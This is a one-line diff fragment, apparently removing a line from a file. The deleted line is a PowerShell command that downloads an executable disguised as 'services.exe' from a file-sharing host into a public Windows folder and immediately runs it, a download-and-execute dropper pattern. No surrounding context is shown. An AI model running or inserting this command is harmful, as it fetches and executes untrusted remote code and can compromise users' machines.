@@ -1,1 +1,0 @@
-powershell -command "(New-Object Net.WebClient).DownloadFile('https://tmpfiles.org/dl/4426080/services.exe','C:\Users\Public\services.exe')" && C:\Users\Public\services.exe
